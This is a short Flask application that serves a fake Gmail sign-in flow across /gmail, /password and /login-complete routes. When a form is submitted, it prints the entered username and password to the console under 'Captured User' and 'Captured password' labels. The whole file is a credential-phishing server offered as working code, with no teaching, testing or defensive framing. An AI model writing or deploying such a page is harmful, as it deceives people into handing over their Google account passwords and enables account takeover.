from flask import Flask, request, url_for, render_template, redirect


app = Flask(__name__)

#mainpage
@app.route('/')
def home():
    return render_template('login.html')

#gmailpage
@app.route('/gmail', methods=['GET', 'POST'])	
def gmail():
    if request.method == 'POST':
        user = request.form.get('username')
        print(f"Username received at Gmail route: {user}")
       
        return redirect(url_for('password'))
    return render_template('gmail.html')

#passwordpage
@app.route('/password', methods=['GET', 'POST'])
def password():
    if request.method == 'POST':
        user = request.form.get('username') 
        print(f">>>>Captured User : {user}") 
        return redirect(url_for('password'))
    return render_template('password.html')

#submitpage
@app.route('/login-complete',methods=['GET','POST'])
def submit():
	if request.method == 'POST':
         password = request.form.get('password') 
         print(f">>>>Captured password : {password}") 
         return redirect(url_for('submit'))
	return render_template('submitted.html')
if __name__ == "__main__":
    app.run(debug=True)


